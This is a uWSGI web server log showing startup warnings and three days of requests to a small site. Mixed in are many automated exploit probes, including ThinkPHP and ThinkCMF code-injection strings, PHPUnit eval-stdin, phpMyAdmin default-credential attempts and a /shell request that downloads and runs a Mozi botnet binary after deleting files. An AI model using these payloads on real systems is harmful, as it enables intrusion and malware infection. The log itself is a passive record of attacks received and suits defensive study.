*** Starting uWSGI 2.0.18 (64bit) on [Sun Jun  7 09:41:47 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-4.15.0-1065-aws #69-Ubuntu SMP Thu Mar 26 02:17:29 UTC 2020
nodename: ip-172-31-40-103
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 255081
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Apr 18 2020, 01:56:04)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x55dc45437d00
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x55dc45437d00 pid: 24532 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 24532, cores: 1)
[pid: 24532|app: 0|req: 1/1] 121.171.33.37 () {42 vars in 810 bytes} [Sun Jun  7 09:41:53 2020] GET / => generated 1360 bytes in 11 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 2/2] 121.171.33.37 () {42 vars in 810 bytes} [Sun Jun  7 09:41:54 2020] GET / => generated 1360 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 3/3] 121.171.33.37 () {42 vars in 867 bytes} [Sun Jun  7 09:41:55 2020] GET /chat/ => generated 1411 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 4/4] 211.249.204.135 () {46 vars in 710 bytes} [Sun Jun  7 09:48:38 2020] GET / => generated 1360 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 5/5] 121.171.33.37 () {40 vars in 780 bytes} [Sun Jun  7 09:48:41 2020] GET / => generated 1360 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 6/6] 121.171.33.37 () {42 vars in 811 bytes} [Sun Jun  7 09:50:34 2020] GET / => generated 1360 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 7/7] 121.171.33.37 () {42 vars in 811 bytes} [Sun Jun  7 09:50:34 2020] GET / => generated 1360 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 8/8] 121.171.33.37 () {42 vars in 811 bytes} [Sun Jun  7 09:52:29 2020] GET / => generated 1360 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 9/9] 121.53.241.14 () {46 vars in 742 bytes} [Sun Jun  7 10:07:07 2020] GET / => generated 1360 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 10/10] 211.249.204.130 () {46 vars in 717 bytes} [Sun Jun  7 11:40:03 2020] GET / => generated 1360 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
Not Found: /portal/redlion
[pid: 24532|app: 0|req: 11/11] 162.243.136.238 () {34 vars in 423 bytes} [Sun Jun  7 12:25:10 2020] GET /portal/redlion => generated 2212 bytes in 4 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
Empty python request. skip.
[pid: 24532|app: -1|req: -1/12]  () {0 vars in 0 bytes} [Sun Jun  7 13:48:43 2020]   => generated 0 bytes in 0 msecs ( 0) 0 headers in 0 bytes (0 switches on core 0)
invalid request block size: 21573 (max 4096)...skip
[pid: 24532|app: 0|req: 12/13] 139.162.106.181 () {32 vars in 401 bytes} [Sun Jun  7 14:55:57 2020] GET / => generated 1360 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
Not Found: /boaform/admin/formLogin
[pid: 24532|app: 0|req: 13/14] 80.82.78.104 () {48 vars in 875 bytes} [Sun Jun  7 14:57:10 2020] POST /boaform/admin/formLogin => generated 2243 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 14/15] 80.82.78.104 () {40 vars in 627 bytes} [Sun Jun  7 17:01:24 2020] GET / => generated 1360 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
Not Found: /solr/admin/info/system
[pid: 24532|app: 0|req: 15/16] 195.54.160.135 () {34 vars in 556 bytes} [Sun Jun  7 18:38:28 2020] GET /solr/admin/info/system?wt=json => generated 2247 bytes in 4 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 16/17] 195.54.160.135 () {36 vars in 653 bytes} [Sun Jun  7 18:39:05 2020] GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> => generated 1360 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 17/18] 195.54.160.135 () {34 vars in 556 bytes} [Sun Jun  7 18:39:12 2020] GET /?XDEBUG_SESSION_START=phpstorm => generated 1360 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
Not Found: /index.php
[pid: 24532|app: 0|req: 18/19] 195.54.160.135 () {34 vars in 716 bytes} [Sun Jun  7 18:40:39 2020] GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP => generated 2317 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
Not Found: /api/jsonws/invoke
[pid: 24532|app: 0|req: 19/20] 195.54.160.135 () {38 vars in 610 bytes} [Sun Jun  7 19:01:05 2020] POST /api/jsonws/invoke => generated 2225 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
[pid: 24532|app: 0|req: 20/21] 195.54.160.135 () {36 vars in 624 bytes} [Sun Jun  7 19:48:01 2020] GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php => generated 2323 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
[pid: 24532|app: 0|req: 21/22] 195.54.160.135 () {38 vars in 712 bytes} [Sun Jun  7 19:58:41 2020] POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php => generated 2324 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 22/23] 172.104.108.109 () {34 vars in 391 bytes} [Sun Jun  7 20:50:42 2020] GET / => generated 1360 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 23/24] 198.108.66.218 () {34 vars in 394 bytes} [Sun Jun  7 21:39:21 2020] GET / => generated 1360 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 24/25] 45.83.64.120 () {42 vars in 575 bytes} [Sun Jun  7 23:04:52 2020] GET / => generated 1360 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 25/26] 211.249.205.134 () {46 vars in 743 bytes} [Mon Jun  8 00:15:27 2020] GET / => generated 1360 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
Not Found: /TP/public/index.php
[pid: 24532|app: 0|req: 26/27] 182.254.166.203 () {34 vars in 502 bytes} [Mon Jun  8 01:24:55 2020] GET /TP/public/index.php => generated 2227 bytes in 4 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
Not Found: /TP/index.php
[pid: 24532|app: 0|req: 27/28] 182.254.166.203 () {34 vars in 488 bytes} [Mon Jun  8 01:24:55 2020] GET /TP/index.php => generated 2206 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
Not Found: /thinkphp/html/public/index.php
[pid: 24532|app: 0|req: 28/29] 182.254.166.203 () {34 vars in 524 bytes} [Mon Jun  8 01:24:56 2020] GET /thinkphp/html/public/index.php => generated 2260 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
Not Found: /html/public/index.php
[pid: 24532|app: 0|req: 29/30] 182.254.166.203 () {34 vars in 506 bytes} [Mon Jun  8 01:24:56 2020] GET /html/public/index.php => generated 2233 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
Not Found: /public/index.php
[pid: 24532|app: 0|req: 30/31] 182.254.166.203 () {34 vars in 496 bytes} [Mon Jun  8 01:24:56 2020] GET /public/index.php => generated 2218 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
Not Found: /TP/html/public/index.php
[pid: 24532|app: 0|req: 31/32] 182.254.166.203 () {34 vars in 512 bytes} [Mon Jun  8 01:24:57 2020] GET /TP/html/public/index.php => generated 2242 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
Not Found: /elrekt.php
[pid: 24532|app: 0|req: 32/33] 182.254.166.203 () {34 vars in 484 bytes} [Mon Jun  8 01:24:57 2020] GET /elrekt.php => generated 2200 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
Not Found: /index.php
[pid: 24532|app: 0|req: 33/34] 182.254.166.203 () {34 vars in 482 bytes} [Mon Jun  8 01:24:58 2020] GET /index.php => generated 2197 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 34/35] 182.254.166.203 () {34 vars in 467 bytes} [Mon Jun  8 01:24:59 2020] GET / => generated 1360 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 35/36] 209.17.96.98 () {30 vars in 409 bytes} [Mon Jun  8 01:51:13 2020] GET / => generated 1360 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 36/37] 119.50.82.115 () {36 vars in 556 bytes} [Mon Jun  8 03:33:09 2020] HEAD / => generated 1360 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 37/38] 51.254.59.113 () {32 vars in 450 bytes} [Mon Jun  8 04:28:26 2020] GET / => generated 1360 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
Not Found: /manager/text/list
[pid: 24532|app: 0|req: 38/39] 198.199.115.134 () {34 vars in 429 bytes} [Mon Jun  8 04:29:26 2020] GET /manager/text/list => generated 2221 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
Not Found: /phpmyadmin/index.php
[pid: 24532|app: 0|req: 39/40] 89.154.165.167 () {34 vars in 553 bytes} [Mon Jun  8 06:05:17 2020] GET /phpmyadmin/index.php?lang=en => generated 2238 bytes in 5 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
Not Found: /phpMyadmin/index.php
[pid: 24532|app: 0|req: 40/41] 89.154.165.167 () {34 vars in 553 bytes} [Mon Jun  8 06:05:18 2020] GET /phpMyadmin/index.php?lang=en => generated 2238 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
Not Found: /phpMyAdmin/index.php
[pid: 24532|app: 0|req: 41/42] 89.154.165.167 () {34 vars in 553 bytes} [Mon Jun  8 06:05:19 2020] GET /phpMyAdmin/index.php?lang=en => generated 2238 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
Not Found: /phpMyAdmin/index.php
[pid: 24532|app: 0|req: 42/43] 89.154.165.167 () {34 vars in 633 bytes} [Mon Jun  8 06:05:19 2020] GET /phpMyAdmin/index.php?lang=en&pma_username=popa3d&pma_password=popa3d => generated 2286 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
Not Found: /.git/config
[pid: 24532|app: 0|req: 43/44] 182.253.60.254 () {34 vars in 406 bytes} [Mon Jun  8 06:18:05 2020] GET /.git/config => generated 2203 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 44/45] 80.82.77.139 () {34 vars in 535 bytes} [Mon Jun  8 06:26:40 2020] GET / => generated 1360 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
Not Found: /robots.txt
[pid: 24532|app: 0|req: 45/46] 80.82.77.139 () {30 vars in 358 bytes} [Mon Jun  8 06:26:41 2020] GET /robots.txt => generated 2200 bytes in 4 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
Not Found: /sitemap.xml
[pid: 24532|app: 0|req: 46/47] 80.82.77.139 () {30 vars in 360 bytes} [Mon Jun  8 06:26:41 2020] GET /sitemap.xml => generated 2203 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
Not Found: /.well-known/security.txt
[pid: 24532|app: 0|req: 47/48] 80.82.77.139 () {30 vars in 386 bytes} [Mon Jun  8 06:26:42 2020] GET /.well-known/security.txt => generated 2242 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
Not Found: /favicon.ico
[pid: 24532|app: 0|req: 48/49] 80.82.77.139 () {36 vars in 453 bytes} [Mon Jun  8 06:26:43 2020] GET /favicon.ico => generated 2203 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 49/50] 185.216.140.6 () {34 vars in 393 bytes} [Mon Jun  8 07:01:57 2020] GET / => generated 1360 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
Not Found: /hudson
[pid: 24532|app: 0|req: 50/51] 162.243.136.189 () {34 vars in 407 bytes} [Mon Jun  8 11:26:30 2020] GET /hudson => generated 2188 bytes in 4 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
Not Found: /solr/admin/info/system
[pid: 24532|app: 0|req: 51/52] 195.54.160.135 () {34 vars in 556 bytes} [Mon Jun  8 12:16:33 2020] GET /solr/admin/info/system?wt=json => generated 2247 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 52/53] 195.54.160.135 () {36 vars in 653 bytes} [Mon Jun  8 12:25:32 2020] GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> => generated 1360 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 53/54] 195.54.160.135 () {34 vars in 556 bytes} [Mon Jun  8 12:25:33 2020] GET /?XDEBUG_SESSION_START=phpstorm => generated 1360 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
Not Found: /index.php
[pid: 24532|app: 0|req: 54/55] 195.54.160.135 () {34 vars in 716 bytes} [Mon Jun  8 12:43:38 2020] GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP => generated 2317 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
Not Found: /index.php
[pid: 24532|app: 0|req: 55/56] 185.244.39.112 () {36 vars in 641 bytes} [Mon Jun  8 13:18:43 2020] GET /index.php => generated 2197 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 56/57] 162.243.145.33 () {34 vars in 394 bytes} [Mon Jun  8 15:25:54 2020] GET / => generated 1360 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
Not Found: /api/jsonws/invoke
[pid: 24532|app: 0|req: 57/58] 195.54.160.135 () {38 vars in 610 bytes} [Mon Jun  8 16:24:12 2020] POST /api/jsonws/invoke => generated 2225 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
Not Found: /solr/admin/info/system
[pid: 24532|app: 0|req: 58/59] 195.54.160.135 () {34 vars in 556 bytes} [Mon Jun  8 20:52:01 2020] GET /solr/admin/info/system?wt=json => generated 2247 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 59/60] 195.54.160.135 () {36 vars in 653 bytes} [Mon Jun  8 20:54:15 2020] GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> => generated 1360 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 60/61] 195.54.160.135 () {34 vars in 556 bytes} [Mon Jun  8 20:54:25 2020] GET /?XDEBUG_SESSION_START=phpstorm => generated 1360 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
Not Found: /index.php
[pid: 24532|app: 0|req: 61/62] 195.54.160.135 () {34 vars in 716 bytes} [Mon Jun  8 21:00:09 2020] GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP => generated 2317 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 62/63] 185.172.110.235 () {42 vars in 679 bytes} [Mon Jun  8 22:05:17 2020] GET / => generated 1360 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
Not Found: /api/jsonws/invoke
[pid: 24532|app: 0|req: 63/64] 195.54.160.135 () {38 vars in 610 bytes} [Mon Jun  8 22:05:33 2020] POST /api/jsonws/invoke => generated 2225 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 64/65] 128.14.209.178 () {34 vars in 488 bytes} [Tue Jun  9 01:10:25 2020] GET / => generated 1360 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 65/66] 183.136.225.46 () {34 vars in 497 bytes} [Tue Jun  9 01:25:49 2020] GET / => generated 1360 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
Not Found: /portal/redlion
[pid: 24532|app: 0|req: 66/67] 162.243.135.167 () {34 vars in 423 bytes} [Tue Jun  9 03:38:27 2020] GET /portal/redlion => generated 2212 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
invalid request block size: 21573 (max 4096)...skip
[pid: 24532|app: 0|req: 67/68] 209.17.97.66 () {30 vars in 409 bytes} [Tue Jun  9 04:24:58 2020] GET / => generated 1360 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 68/69] 183.136.225.44 () {34 vars in 459 bytes} [Tue Jun  9 07:20:50 2020] GET / => generated 1360 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 69/70] 212.129.3.22 () {30 vars in 335 bytes} [Tue Jun  9 09:41:59 2020] GET / => generated 1360 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 70/71] 192.35.168.144 () {34 vars in 394 bytes} [Tue Jun  9 09:49:28 2020] GET / => generated 1360 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 71/72] 128.14.209.242 () {34 vars in 488 bytes} [Tue Jun  9 10:17:59 2020] GET / => generated 1360 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
Not Found: /shell
[pid: 24532|app: 0|req: 72/73] 113.100.225.177 () {34 vars in 644 bytes} [Tue Jun  9 10:18:20 2020] GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws => generated 2275 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
Not Found: /TP/public/index.php
[pid: 24532|app: 0|req: 73/74] 175.24.84.140 () {34 vars in 500 bytes} [Tue Jun  9 11:34:34 2020] GET /TP/public/index.php => generated 2227 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
Not Found: /TP/index.php
[pid: 24532|app: 0|req: 74/75] 175.24.84.140 () {34 vars in 486 bytes} [Tue Jun  9 11:34:34 2020] GET /TP/index.php => generated 2206 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
Not Found: /thinkphp/html/public/index.php
[pid: 24532|app: 0|req: 75/76] 175.24.84.140 () {34 vars in 522 bytes} [Tue Jun  9 11:34:34 2020] GET /thinkphp/html/public/index.php => generated 2260 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
Not Found: /html/public/index.php
[pid: 24532|app: 0|req: 76/77] 175.24.84.140 () {34 vars in 504 bytes} [Tue Jun  9 11:34:35 2020] GET /html/public/index.php => generated 2233 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
Not Found: /public/index.php
[pid: 24532|app: 0|req: 77/78] 175.24.84.140 () {34 vars in 494 bytes} [Tue Jun  9 11:34:36 2020] GET /public/index.php => generated 2218 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
Not Found: /TP/html/public/index.php
[pid: 24532|app: 0|req: 78/79] 175.24.84.140 () {34 vars in 510 bytes} [Tue Jun  9 11:34:36 2020] GET /TP/html/public/index.php => generated 2242 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
Not Found: /elrekt.php
[pid: 24532|app: 0|req: 79/80] 175.24.84.140 () {34 vars in 482 bytes} [Tue Jun  9 11:34:36 2020] GET /elrekt.php => generated 2200 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
Not Found: /index.php
[pid: 24532|app: 0|req: 80/81] 175.24.84.140 () {34 vars in 480 bytes} [Tue Jun  9 11:34:37 2020] GET /index.php => generated 2197 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 81/82] 175.24.84.140 () {34 vars in 465 bytes} [Tue Jun  9 11:34:37 2020] GET / => generated 1360 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
Not Found: /solr/admin/info/system
[pid: 24532|app: 0|req: 82/83] 195.54.160.135 () {34 vars in 556 bytes} [Tue Jun  9 14:48:17 2020] GET /solr/admin/info/system?wt=json => generated 2247 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 83/84] 195.54.160.135 () {36 vars in 653 bytes} [Tue Jun  9 14:57:55 2020] GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> => generated 1360 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 84/85] 195.54.160.135 () {34 vars in 556 bytes} [Tue Jun  9 14:57:55 2020] GET /?XDEBUG_SESSION_START=phpstorm => generated 1360 bytes in 0 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
Not Found: /index.php
[pid: 24532|app: 0|req: 85/86] 195.54.160.135 () {34 vars in 716 bytes} [Tue Jun  9 15:13:36 2020] GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP => generated 2317 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 86/87] 72.80.60.81 () {28 vars in 305 bytes} [Tue Jun  9 16:28:01 2020] GET / => generated 1360 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 87/88] 196.52.43.127 () {30 vars in 432 bytes} [Tue Jun  9 17:21:35 2020] GET / => generated 1360 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
Not Found: /api/jsonws/invoke
[pid: 24532|app: 0|req: 88/89] 195.54.160.135 () {38 vars in 610 bytes} [Tue Jun  9 18:41:09 2020] POST /api/jsonws/invoke => generated 2225 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 89/90] 128.14.134.170 () {34 vars in 488 bytes} [Tue Jun  9 19:36:14 2020] GET / => generated 1360 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
invalid request block size: 21573 (max 4096)...skip
invalid request block size: 21573 (max 4096)...skip
invalid request block size: 7937 (max 4096)...skip
[pid: 24532|app: 0|req: 90/91] 50.30.32.186 () {38 vars in 570 bytes} [Tue Jun  9 22:04:17 2020] GET / => generated 1360 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 91/92] 209.17.96.42 () {30 vars in 409 bytes} [Tue Jun  9 23:24:22 2020] GET / => generated 1360 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 92/93] 203.237.164.115 () {40 vars in 783 bytes} [Wed Jun 10 05:08:36 2020] GET / => generated 1360 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 93/94] 203.237.164.115 () {40 vars in 783 bytes} [Wed Jun 10 05:08:38 2020] GET / => generated 1360 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 94/95] 203.237.164.115 () {40 vars in 793 bytes} [Wed Jun 10 05:08:44 2020] GET /admin => generated 0 bytes in 0 msecs (HTTP/1.1 301) 4 headers in 145 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 95/96] 203.237.164.115 () {40 vars in 783 bytes} [Wed Jun 10 05:08:47 2020] GET / => generated 1360 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 96/97] 203.237.164.115 () {40 vars in 783 bytes} [Wed Jun 10 05:08:48 2020] GET / => generated 1360 bytes in 0 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 97/98] 203.237.164.115 () {40 vars in 783 bytes} [Wed Jun 10 05:09:03 2020] GET / => generated 1360 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 98/99] 203.237.164.115 () {40 vars in 783 bytes} [Wed Jun 10 05:09:52 2020] GET / => generated 1360 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 99/100] 203.237.164.115 () {42 vars in 807 bytes} [Wed Jun 10 05:09:52 2020] GET / => generated 1360 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 100/101] 203.237.164.115 () {42 vars in 807 bytes} [Wed Jun 10 05:09:59 2020] GET / => generated 1360 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 101/102] 203.237.164.115 () {40 vars in 783 bytes} [Wed Jun 10 05:10:00 2020] GET / => generated 1360 bytes in 0 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 102/103] 203.237.164.115 () {42 vars in 807 bytes} [Wed Jun 10 05:10:00 2020] GET / => generated 1360 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 103/104] 203.237.164.115 () {42 vars in 807 bytes} [Wed Jun 10 05:10:01 2020] GET / => generated 1360 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 104/105] 203.237.164.115 () {40 vars in 783 bytes} [Wed Jun 10 05:10:08 2020] GET / => generated 1360 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 24532|app: 0|req: 105/106] 203.237.164.115 () {40 vars in 783 bytes} [Wed Jun 10 05:10:09 2020] GET / => generated 1360 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
